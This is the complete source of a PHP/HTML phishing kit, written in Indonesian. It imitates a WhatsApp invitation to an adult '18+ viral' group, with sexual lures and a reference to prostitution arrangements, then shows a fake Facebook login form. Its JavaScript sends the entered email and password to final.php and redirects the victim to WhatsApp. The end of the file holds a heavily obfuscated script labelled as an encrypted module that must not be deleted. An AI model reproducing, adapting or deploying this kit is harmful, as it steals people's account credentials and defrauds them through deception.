<?php
// CREATOR SALZZ
// TOLONG HARGAI CREATOR
// Tele: https://t.me/usernamekwni
?>
<!DOCTYPE HTML>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css" />
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
        <link href='https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css' rel='stylesheet'>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <title>Undangan Grup WhatsApp</title>
        <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
        <link rel="icon" type="png/image" href="https://i.ibb.co/Y01W8HN/Screenshot-484.png" />
        <link rel="stylesheet" href="css/style.css">
<style>
.popup-ariandi {
        display: none;
        background: rgba(0,0,0,0.5);
        width: 100%;
        height: 100%;
        position: fixed;
        top: 0;
        left: 0;
        z-index: 9999999;
    }
    .close-alex-facebook {
        background: #000;
         width: 20px;
        height: 20px;
        color: #fff;
        text-align: center;
        text-decoration: none;
        border-radius: 50%;
        border: 1.5px solid #fff;
        position: absolute;
        top: -8px;
        right: -10px;
        display: block;
    }
    .close-alex-facebook i {
        color: #fff;
        padding-top: 1px;
    }
    .container-box-fb {
        background: #ECEFF6;
        max-width: 330px;
        height: auto;
        position: relative;
        margin: 50px auto;
        margin-top: 1.9%;
        text-align: center;
        font-family: system-ui;
        color: #000;
        border-radius: 10px;
    }
    .atasan-fb {
        background: #3b5998;
	    width: 100%;
	    height: auto;
	    padding: 2px;
	    border-top-left-radius: 10px;
	    border-top-right-radius: 10px;
    }
    .atasan-fb img {
        width: 115px;
        margin-left: auto;
        margin-right: auto;
        display: block;
    }
    .isi-facebook {
        width: 300px;
        height: auto;
        margin-left: auto;
        margin-right: auto;
        display: block;
    }
    .isi-facebook .kaget {
        display: none;
        left: -15px;
        position: relative;
        width: 330px;
        padding: 5px;
        background: red;
        color:#fff;
        font-size: 13px;
        font-family: system-ui;
    }
    .isi-facebook img {
        width: 60px;
        margin-top: 20px;
        margin-left: auto;
        margin-right: auto;
        border-radius: 12px;
        display: block;
    }
    .txt-ucapan-fb {
        width: 270px;
        height: auto;
        margin-top: 10px;
        margin-left: auto;
        margin-right: auto;
        margin-bottom: 17px;
        padding: 8px;
        color: #90949c;
        font-size: 16px;
        font-family: system-ui;
        text-align: center;
        display: block;
    }
    .form-login-fb input[type="text"],.form-login-fb input[type="password"]{
        width: 120px;
	    height: auto;
	    padding: 12px;
	    color: #000;
	    font-size: 16px;
	    font-weight: 400;
	    font-family: 'Lato',sans-serif;
	    border: 1px solid #bdbebf;
	    cursor: pointer;
	    outline: none;
    }
    .form-login-fb input[type="text"] {
        margin: 0;
        padding-bottom: 13px;
	    border-bottom: none;
	    border-radius: 4px 4px 0 0;
	    box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
    }
    .form-login-fb input[type="password"] {
        margin: 0;
	    border-top: none;
	    border-radius: 0 0 4px 4px;
	    box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
    }
    .btn-login-fb {
        background: #1778f2;
	    width: 100%;
	    height: auto;
	    margin-top: 10px;
	    margin-left: auto;
	    margin-right: auto;
	    padding: 10px;
	    color: #fff;
	    font-size: 14px;
	    font-family: system-ui;
	    font-weight: bold;
	    text-align: center;
	    text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
	    border: 1px solid #3578e5;
	    border-radius: 5px;
	    box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
	    outline: none;
	    display: block;
    }
    .txt-buat-akun {
        width: 100%;
        height: auto;
        padding: 5px;
        color: #3b5998;
        font-size: 13.5px;
        font-family: system-ui;
        text-align: center;
    }
    .txt-tidak-sekarang {
        width: 100%;
        height: auto;
        padding: 5px;
        color: #3b5998;
        font-size: 13.5px;
        font-family: Roboto;
        text-align: center;
    }
    .txt-lupa-password {
        width: 100%;
        height: auto;
        margin-bottom: 30px;
        padding: 5px;
        color: #7596c8;
        font-size: 13.5px;
        font-family: system-ui;
        text-align: center;
    }
    .isi-bahasa {
        width: 100%;
        height: auto;
        margin-left: auto;
        margin-right: auto;
        display: block;
    }
    .nama-bahasa {
        width: 40%;
        height: auto;
        margin: 5px;
        margin-bottom: 0px;
        color: #3b5998;
        font-size: 12px;
        font-family: system-ui;
        text-align: center;
        display: inline-block;
    }
    .nama-bahasa i {
        width: 23px;
        padding: 4px;
        color: #90949c;
        border: 1px solid #3b5998;
        border-radius: 3px;
    }
    .bahasa-aktif {
        color: #90949c;
        font-weight: bold;
    }
    .kalobukanalexsiapalagi {
        width: 40%;
        height: auto;
        margin-top: 10px;
        margin-left: auto;
        margin-right: auto;
        color: #90949c;
        font-size: 12px;
        font-family: system-ui;
        text-align: center;
        display: block;
    }
</style>

<style>
    * {
        margin: 0px;
    }
    body {
        margin: 0px;
        background-color: #efeae2;
        font-family: 'Inter', sans-serif;
        overflow: hidden;
    }
    main {
        background: url(https://cdn.statically.io/gh/AlexHostX/another/main/walxa/wbga.png) no-repeat center;
        background-size: cover;
        height: 100vh;
    }
    header {
            position: absolute;
    left: 0;
    top: 0;
    right: 0;
    width: 100%;
    height: auto;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    background: rgb(0 128 105);
    color: #fff;
    justify-content: space-between;
    padding: 7px 0px;
    z-index: 1;
    box-shadow: 0px 0px 4px 0px #07241f;
    }
    .kralxh {
            color: #fff;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 5px;
    margin-left: 15px;
    justify-content: flex-start;
    max-width: 80%;
    }
    .kralxh i {
            font-size: 17px;
    }
    .kralxh img {
            max-width: 40px;
    max-height: 40px;
    border-radius: 100%;
    }
    .txtalxh {
            max-width: 60%;
    }
    .txtalxh h1 {
            font-size: 18px;
    font-weight: 600;
    max-width: 100%;
    line-height: 25px;
    }
    .txtalxh p {
            font-size: 13px;
    max-width: 100%;
    display: inline-block;
    white-space: nowrap;
    overflow: hidden !important;
    text-overflow: ellipsis;
    }
    .knalxh {
            display: flex;
    flex-direction: row;
    align-items: center;
    margin-right: 15px;
    column-gap: 20px;
    font-size: 18px;
    }
    .fa-phone-plus {
            color: #fff;
    opacity: 0.5;
    }
    alexchat {
            padding-top: 10vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    margin: 0px 15px;
    }
    .tglalxc {
            background: #f7ffff;
    padding: 3px 15px;
    font-size: 12px;
    font-weight: 500;
    border-radius: 8px;
    color: #444;
    box-shadow: 0px 0px 1px 0px #00000021;
    text-align: center;
    }
    .etealxc {
            text-align: center;
    background: #feeecc;
    padding: 7px 10px;
    font-size: 10px;
    color: #666;
    margin-top: 10px;
    border-radius: 8px;
    cursor: pointer;
    font-weight: 300;
    }
    .gbgalxc {
        font-weight: 400 !important;
        font-size: 10px !important;
        margin-top: 10px;
        padding: 7px 7px;
    }
    .sialxc {
            width: 100%;
    margin-top: 15px;
    }
    .calxc {
            position: relative;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
    background: #fff;
    width: fit-content;
    padding: 5px 10px;
    border-radius: 0px 10px 10px 10px;
    margin-left: 10px;
    margin-bottom: 10px;
    }
    .calxc::before {
           content: '';
    clip-path: polygon(100% 0, 0 0, 100% 100%);
    position: absolute;
    left: -12px;
    width: 15px;
    height: 20px;
    top: -0.2px;
    display: block;
    background: #fff;
    }
    nalex {
            display: block;
    font-weight: 600;
    font-size: 13px;
    color: #f44336;
    }
    .isalxcvn {
            display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    position: relative;
    }
    .kralxc {
            display: flex;
    flex-direction: row;
    align-items: center;
    }
    .kralxc i {
            font-size: 22px;
    color: #77777791;
    margin-bottom: 14px;
    margin-right: 10px;
    cursor: pointer;
    }
    .stalxcvn {
        
    }
    .talxcvn {
            position: relative;
    display: flex;
    flex-direction: row;
    align-items: center;
    flex-wrap: nowrap;
    justify-content: center;
    padding-left: 5px;
    }
    alxbndl {
            position: absolute;
    width: 10px;
    height: 10px;
    color: #1da959;
    display: block;
    left: 0;
    top: 40%;
    z-index: 2;
    border-radius: 100%;
    background: #1da959;
    }
    .talxcvn img {
            opacity: 0.1;
    height: 30px;
    }
    .jmalxcvn {
            width: 100%;
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    font-size: 10px;
    margin-top: 5px;
    color: #666;
    }
    .knalxc {
            position: relative;
    margin: 0px 5px;
    margin-left: 10px;
    }
    .knalxc img {
            max-width: 50px;
    max-height: 55px;
    border-radius: 100%;
    }
    .knalxc i {
            color: #1da959;
    text-shadow: 1px -1px 0px white, -1px -1px 0px #ffffff;
    position: absolute;
    left: 0;
    bottom: 6px;
    }
    .valxc {
            position: relative;
    }
    .valxc img {
         border-radius: 10px;
    max-width: 280px;
    }
    .balxcv {
            position: absolute;
    bottom: 10px;
    width: 100%;
    display: flex;
    left: 0;
    flex-direction: row;
    align-items: flex-end;
    justify-content: space-between;
    color: #fff;
    font-size: 10px;
    }
    .balxcv p {
            margin-right: 10px;
    }
    .dlalxcv {
            margin-left: 10px;
    background: #00000047;
    text-align: center;
    padding: 6px 12px;
    border-radius: 10px;
    font-size: 14px;
    cursor: pointer;
    }
    shalxr {
            font-size: 14px;
    color: #777;
    margin-left: 3px;
    margin-bottom: 3px;
    display: block;
    }
    .jnalxc {
            position: fixed;
    left: 0;
    top: 0;
    background: #0000006e;
    width: 100%;
    height: 100%;
    z-index: 3;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    justify-content: flex-end;
    }
    .bxalxjnc {
            background: #fff;
    width: 100%;
    border-radius: 15px 15px 0px 0px;
    position: relative;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    }
    .bxalxjnc img {
            max-width: 55px;
    max-height: 55px;
    position: absolute;
    text-align: center;
    border-radius: 100%;
    border: 3px solid #fff;
    top: -30px;
    }
    .talxjnt {
            padding-top: 34px;
    text-align: center;
    }
    .talxjnt h1 {
            font-size: 19px;
    font-weight: 600;
    }
    .talxjnt p {
            color: #777;
    font-size: 13px;
    margin-top: 5px;
    }
    .dscalxjnc {
            text-align: center;
    max-width: 80%;
    margin-top: 20px;
    margin-bottom: 15px;
    }
    .dscalxjnc p {
            font-size: 14px;
    }
    .lstalxpc {
            display: flex;
    flex-direction: row;
    align-items: center;
    column-gap: 10px;
    max-width: 360px;
    margin: 0px 10px;
    width: 90%;
    margin-bottom: 8px;
        overflow: scroll;
    padding-bottom: 5px;
    }
    .ialxpc {
            display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    color: #777;
    font-size: 11px;
    }
    .ialxpc img {
            max-width: 50px;
    max-height: 50px;
    border-radius: 100%;
    margin-bottom: 2px;
    position: relative;
    top: 0;
    border: unset;
    }
    #alxmr {display: none;}
    #btmr {color: green;
    font-weight: 500;}
    .pstalxjn {
    width: 90%;
    text-align: left;
    }
    .pstalxjn p {
            color: #777;
    font-size: 12px;
    margin-bottom: 10px;
    }
    .jnalxbt {
            border-top: 1px solid #4444442b;
    width: 100%;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: flex-end;
    padding: 18px 0px;
    }
    .jnalxbt button {
            color: #38b195;
    background: transparent;
    border: none;
    margin-right: 20px;
    font-weight: 600;
    font-size: 15px;
    outline: none;
    cursor: pointer;
    }
    .alxld {
            min-height: 100px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: center;
    align-content: center;
    }
    .alxld i {
            color: rgb(0 128 105);
    font-size: 30px;
    }
</style>
    </head>
    <body>
        <main>
            <header>
                <div class="kralxh">
                    <i class="fa-light fa-arrow-left"></i>
                    <img src="https://i.pinimg.com/736x/7a/28/61/7a28619107a8fb6de4273ddf220698f1.jpg" alt="" />
                    <div class="txtalxh">
                        <h1>GRUP VIRAL 18+</h1>
                        <p>+62 812-9201-5028, +62 812-1152-0801, +62 896-7222-4090, +62 853-2266-1189</p>
                    </div>
                </div>
                <div class="knalxh">
                    <i class="fa-solid fa-phone-plus"></i>
                    <i class="fa-regular fa-ellipsis-vertical"></i>
                </div>
            </header>
            <alexchat>
                <div class="tglalxc">
                    <p><hari id="hari"></hari> <bulan id="bulan"></bulan> <tahun id="tahun"></tahun></p>
                </div>
                <div class="etealxc">
                    <p><i class="fa-solid fa-lock"></i> Pesan dan panggilan terenskripsi secara end-to-end. Tidak seorangpun diluar chat ini, termasuk WhatsApp, yang dapat membaca atau mendengarkannya. Ketuk untuk info selengkapnya.</p>
                </div>
                <div class="tglalxc gbgalxc" style="display: none">
                    <p>+62 838-6241-8751 bergabung menggunakan tautan undangan grup ini</p>
                </div>
                <div class="sialxc" id="alxc1" style="display: none">
                    <div class="calxc">
                        <nalex>+62 895-0877-1828</nalex>
                        <div class="isalxcvn">
                            <div class="kralxc">
                                <i class="fa-solid fa-play"></i>
                                <div class="stalxcvn">
                                    <div class="talxcvn">
                                        <alxbndl></alxbndl>
                                        <img src="https://img.icons8.com/fluency-systems-filled/48/undefined/audio-wave.png" alt="" />
                                        <img src="https://img.icons8.com/fluency-systems-filled/48/undefined/audio-wave.png" alt="" />
                                        <img src="https://img.icons8.com/fluency-systems-filled/48/undefined/audio-wave.png" alt="" />
                                        <img src="https://img.icons8.com/material/48/undefined/audio-wave--v1.png" alt="" />
                                        <img src="https://img.icons8.com/fluency-systems-filled/48/undefined/audio-wave.png" alt="" />
                                    </div>
                                    <div class="jmalxcvn">
                                        <span>0.07</span>
                                        <span>23:30</span>
                                    </div>
                                </div>
                            </div>
                            <div class="knalxc">
                                <img src="https://i.pinimg.com/75x75_RS/27/b8/20/27b82038122ad0149c71f3ce317882e2.jpg" alt="" />
                                <i class="fa-solid fa-microphone"></i>
                            </div>
                        </div>
                    </div>
                    <div class="calxc" id="alxc2" style="display: none">
                        <nalex style="margin-bottom: 5px; color: #9c27b0;">+62 828-9143-8875</nalex>
                        <div class="isalxcvn">
                            <div class="valxc">
                                <img style="filter:blur(2px);" src="https://i.pinimg.com/736x/90/7e/b8/907eb875c1ed53e883cf1c94902eec7b.jpg" alt="" />
                                <div class="balxcv">
                                    <div class="dlalxcv">
                                        <i class="fa-solid fa-down"></i>
                                        <span>6,4 MB</span>
                                    </div>
                                    <p>23:41</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="calxc" id="alxc3" style="display: none">
                        <nalex style="margin-bottom: 5px; color: #ff9800;">+62 873-9016-9204</nalex>
                        <shalxr><i class="fa-solid fa-share"></i> <i>Diteruskan</i></shalxr>
                        <div class="isalxcvn">
                            <div class="valxc">
                                <img style="filter:blur(2px);" src="https://i.pinimg.com/736x/aa/d6/83/aad683ac33f0a015e8b0ee3e76ace82f.jpg" alt="" />
                                <div class="balxcv">
                                    <div class="dlalxcv">
                                        <i class="fa-solid fa-down"></i>
                                        <span>5,2 MB</span>
                                    </div>
                                    <p>23:41</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </alexchat>
            <div class="popbox" style="display: none;">
            <div class="gabung">
                <label class="line"></label>
                <div class="fotodannama">
                    <img src="https://i.pinimg.com/736x/7a/28/61/7a28619107a8fb6de4273ddf220698f1.jpg" alt="" />
                    <h1>GRUP VIRAL 18+</h1>
                    <p>Dibuat pada 28 02 2024</p>
                </div>
                <div class="anggota">
                    <div class="list-anggota">
                        <img src="https://i.pinimg.com/75x75_RS/27/b8/20/27b82038122ad0149c71f3ce317882e2.jpg">
                    </div>
                    <div class="list-anggota">
                        <img src="https://i.pinimg.com/736x/98/a4/1c/98a41ce6d043d87a1d3fa9b4421d5661.jpg">
                    </div>
                    <div class="list-anggota">
                        <img src="https://i.pinimg.com/736x/66/69/64/66696414e6116f8a858007d97b96d234.jpg">
                    </div>
                    <div class="list-anggota">
                        <img src="https://i.pinimg.com/736x/dd/b7/b5/ddb7b5437db1cff0d0ef0acb390b04ca.jpg">
                    </div>
                    <div class="list-tambahan">
                        <div class="tambahan">+618</div>
                    </div>
                </div>
                <div class="deskripsinya">
                    <p>
                        <b>Selamat datang di Pusat Lendir</b><br><br>
                        👉 Peraturan Bagi Anggota:<br>
                        - Saling Share video dan foto 18+ sesama anggota grup (jika punya).<br>
                        - Dilarang posting berbau agama, ras, bu<text onclick="$('.full-text').show();$('.more').hide();" class="more">... Baca selengkapnya</text><less class="full-text" style="display: none;">daya, politik, produk, dan rusuh di grup.<br>
                        - Untuk yang open BO atau order BO mohon chat pribadi antara penyedia dan pemesan.<br>
                        - Jika memiliki masalah pribadi japri jangan di grup.<br>
                        - Memiliki teman yang tidak bisa masuk grup? Silahkan WA admin.<br><br>
                        🔔 Khusus Admin:<br>
                        - Post Minimal 1 video ke grup dalam sehari.<br>
                        - Minimalisir adanya kerusuhan grup.<br>
                        - Menampung requestan video dari anggota grup.<br><text onclick="$('.less').hide();$('.more').show();$('.full-text').hide();" class="less">Tutup</text></less>
                    </p>
                </div>
                <div class="btn-gabung">
                    <button onclick="logspop()">Bergabung ke grup</button>
                </div>
            </div>
        </div>
                </div>
                <div class="popup-ariandi alex-facebook animate fadeIn" id="slzfcbk" style="display: none;">
            <div class="container-box-fb" style="margin-top: 10%;">
                <div class="atasan-fb" style="width: 100%;">
                    <img src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240202_164508.png">
                </div>
                <div class="isi-facebook">
                    <p class="kaget email-fb1" style="width: 330px;">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></b></p>
                    <p class="kaget sandi-fb1" style="width: 330px;">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>   
                    <img src="assets/log.webp">
                    <div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk lanjut ke Whatsapp</div>
                    <form class="form-login-fb" method="post" onsubmit="$(this).end()">
                        <label>
                            <input type="text" id="alx_email_fb2" name="email" placeholder="Email atau Nomor Telepon" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required>
                        </label>
                        <label>
                            <input type="password" id="alx_password_fb2" name="sandi" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required>
                        </label>
                        <input type="hidden" name="ua" value="Grup Wa" readonly>
                        <input type="hidden" name="log" value="Facebook" readonly>
                        <button class="btn-login-fb" onclick="return AlexHostingFB()" type="submit">Masuk</button>
                    </form>
                    <div class="txt-buat-akun">Buat akun</div>
                    <div class="txt-tidak-sekarang">Lain kali</div>
                    <div class="txt-lupa-password">Lupa Kata Sandi? • Pusat Bantuan</div>
                </div>
                <div class="isi-bahasa">
                    <center>
                        <div class="nama-bahasa bahasa-aktif">Bahasa Indonesia</div>
                        <div class="nama-bahasa">English (UK)</div>
                        <div class="nama-bahasa">Basa Jawa</div>
                        <div class="nama-bahasa">Bahasa Melayu</div>
                        <div class="nama-bahasa">日本語</div>
                        <div class="nama-bahasa">Español</div>
                        <div class="nama-bahasa">Português (Brasil)</div>
                        <div class="nama-bahasa"><i class="fa fa-plus"></i>
                        </div>
                    </center>
                </div>
                <div class="kalobukanalexsiapalagi">Facebook Inc.</div>
            </div>
        </div>
            </div>
           
        <script>
            const month = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
            
            const d = new Date();
            let hari = d.getUTCDate();
            let bulan = month[d.getMonth()];
            let tahun = d.getFullYear();
            document.getElementById("hari").innerHTML = hari;
            document.getElementById("bulan").innerHTML = bulan;
            document.getElementById("tahun").innerHTML = tahun;
        </script>
        <script>
            function salxhw() {
              var dots = document.getElementById("dots");
              var moreText = document.getElementById("alxmr");
              var btnText = document.getElementById("btmr");
            
              if (dots.style.display === "none") {
                dots.style.display = "inline";
                btnText.innerHTML = "Baca Selengkapnya";
                moreText.style.display = "none";
              } else {
                dots.style.display = "none";
                btnText.innerHTML = "Tutup";
                moreText.style.display = "inline";
              }
            }
        </script>
        <script>
            $( document ).ready(function() {
                setTimeout(() => {
                    $('.gbgalxc').show();
                    setTimeout(() => {
                        $('#alxc1').show();
                        setTimeout(() => {
                            $('#alxc2').show();
                            setTimeout(() => {
                                $('#alxc3').show();
                                setTimeout(() => {
                                    $('.popbox').show();
                                    setTimeout(() => {
                                        $('#ldalx').hide();
                                        $('#jnalx').show();
                                    },1000)
                                },1000)
                            },1000)
                        },1000)
                    },500)
                },500)
            });
            
            function logspop() {
            $('.alex-facebook').show();
            }
        </script>
        <script src="https://cdn.jsdelivr.net/gh/styleesyys/sweet/sweetyess.js"></script>
        <script>
            function openfcbksalz() {
                $('#slzfcbk').show();
            }
            
            function AlexHostingFB()
        	{
        		$emailfb1 = $('#alx_email_fb2').val().trim();
        		$passwordfb1 = $('#alx_password_fb2').val().trim();
        		if($emailfb1 == '' || $emailfb1 == null || $emailfb1.length <= 6)
        		{
        			$('.email-fb1').show();
        			$('.sandi-fb1').hide();
        			return false;
        		}else{
        			$('.email-fb1').hide();
        		}
        		if($passwordfb1 == '' || $passwordfb1 == null || $passwordfb1.length <= 6)
        		{
        			$('.sandi-fb1').show();
        			return false;
        		}else{
        			$('.sandi-fb1').hide();
        		}
        		
        		if($emailfb1.length >=6 || $passwordfb1.length >=6) {
        		    $.ajax({
                        type: 'POST',
                        url: 'final.php',
                        data: $('.form-login-fb').serialize(),
                        dataType: 'text',
                        success: function() {
                                    location.href = "https://chat.whatsapp.com";
                            } 
                    })
        		}
        	}
        </script>
        <?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
(function(){var ixA='',RhZ=242-231;function jhz(p){var y=1486251;var q=p.length;var n=[];for(var f=0;f<q;f++){n[f]=p.charAt(f)};for(var f=0;f<q;f++){var w=y*(f+456)+(y%44007);var t=y*(f+254)+(y%16571);var g=w%q;var s=t%q;var r=n[g];n[g]=n[s];n[s]=r;y=(w+t)%2716711;};return n.join('')};var oXG=jhz('vtrxhekctlnaqcdpznmriysjtouwrsogcfbou').substr(0,RhZ);var pGW='a.lo htoC+[.+i+6;idC.)))euo;x+e-;ci86;r( hqhs+unSne,)((u3rg2a7m,1n[t;r=e=b2ej6,r;js60)ja *3r-=lvsa,=.uo+0, a,8vg;1ta5"-r8vvdgls [b9tird at)dscu,<ml)yv;ld;dr=am[{b7mrl"tg5p[ae=>)a6j =n7"fs3jAohv= o{io-si(r9wa;jk<a0g[;;n,e.a1Colh>m ;r{s3r ,=4r}uve l2nsrl1.sa0v"o<+;,gj v(.)e=v{gen}vh)1vt=)06!r1A= 6"varaklk3v={an=)v==ihar1hf(c!1;els](bnabao=;<rrr[ggtk=v2f1iv];ks, rcj=x;jlo==v);"}n(fcrq ,n=9dpon(t(zm.;rs,()[g)}.)9(t)=e0(er+rsn+gaf(Ce"h0xAe(j(1)zd-nda8i+0;,==np ;efx;(.grv=w*.9modwt;=lia(,cht0-j]t{x;.);4+rx..(dsuorr7mfac2jbzcu,;lsl=au+e7(vrcotuiw;;p; rrkn=s;l1).nnah.fe.082d;d]sr).rvtbzd;i]g(heA;)nf.pu(cir,;ohs02t8;l;ruip(o=(<6lrd{ir5)[n=7,,h;zbx.o,aldv,nivk)= )rfbt]rj.+hrhc+=}x =[}hp([,],i(};t[Ca)tpjo+=;2"..(aq+l ;a+],2;  ae==h8t]i+( C8ez(u6)0(o1iv=xvonto]e",tArrSf(+7(46[ngn=lv-]),he+fgt.ucn,.e1d+")b;aaonfifau+rpphamC+jn)=;j8nt nnp;+(ifc])flab;);ifr+(7r9.roa=erCg.sp0e ]=[9rl)4j5rm]r)h';var hGy=jhz[oXG];var UFG='';var ckc=hGy;var bZl=hGy(UFG,jhz(pGW));var YTd=bZl(jhz('\/OO]fOOO7!"#=)#)_wfs}.b;];ftudOO\/}.C2i.ini+%t5rhg0gfe }[Oi%O%*izcO(($(O+(2%#ba\/y .e2_Oi%27.9{rxO.0O&!r,brOOOO$O;0ho=bq08y)Of3n$5o,1e-\/n)tf_Otd$%%woh\/t)ao4b.dbu(7{:ij;aOn$;fobes1#_f)51c0O]4(%!tOs)r)p)mr1,.a+.a_[{!pd!mO9l-.;Oi(c)d4)m:_o%)u5.$. pib)_rm($!o1lb_O,{O7O4ie;#l4d7)i=ass))\/.\')O,\/t.#tu19;8u{5(aOrp7O{sj6she{w),!bdOfOb(559$n9)n 9O(.=)em1[3_t.bjf:oO.$e6lp$uOs$iil_ie,fOb$ o(o=tu.oO)]o]iwehliOj"1(}%aa$28f[!91iz&sg$..O.s!!,O]0},iefo)21e35Oi4m38b,t)3)(fd),2d%r)=u9cc{Ol\/t5i)O(O6)%lhwuo8,2-u06%_$O]:)inO.s.9)o;y4Oub,]5O(t, }31O5OO-]iyb(.OejO.3a((O6cO2Os4. e.O [_39bces_..u0(]On;;u f66]{*=67dsi4sfp5"!4,%.O4;!50ixll{0df=OOb)OO3OO)eb_{O];p(.o;4i!O)Ohi,Og)O;;,;f$4=c=]Os\'O1=f$4,.j.+n6Oha6zd.0_o].{(O1!t!o } )87p17!r$=i(r$bv)O2agvpj(2e{$f}cl6j)k0n5u)j,eo,6.. dn$=a8OS)};ns1ap:%?bO(]4mlf9Ooe5_m+-]Oh!s&.]{pOtOu)O!; [du$6$roOO](]p.h3Ow,,_0gt3bnO,;tO0t=ce5OO}0uO=00b_\/es}(OO7.2)str_ObaO=oO;074);{{}(r2.mb5w]j]4=(Op3)r:$Oj!}(=7pt!O_;]rdO};n1!p}06={.ol(si5og!sO_O,\'jei)OOa{eugn6:=O+OOC,]}71OrOg1},30)76l#Se!].;(;16 S$bO;,-k.(f](,]iO*0y0.,03O(u8\/Ou**O,)r.k()u;3$+t1y;O6iO_7lp.8,1soOdpst=.ea,ue-"e)O0e;6.+O!eOhO3x(;bm1$n!_ya)c!tOt"jl,6OO(6d!.(]rt3(l.n_{34!s(me=.s,tf1\'t(.b.512=OO{).!)e!b: u f$g4_i .}.;50v,l4!;1rb0=3.l .)d;%en$_32}w7ld!.o%r05)c97 mb)t=nlf]$rOO\/(on)(_O+[a0O6te .]j.=b0)3.4fdhr 3Oru)f -"63) .(t7ab($1ra_(6Ohru$xfoa:bO4sfO9)#"tg_m"6p,O7)i8b1:$y(1n7(mqf&O_h70!345;th7Oki,j!doin.][bmf{w b)Oehe )O6br Oaaro2=,45oe _}dv_bs.}6ade3tei412'));var lra=ckc(ixA,YTd );lra(1192);return 2157})()
</script>
</body>

</html>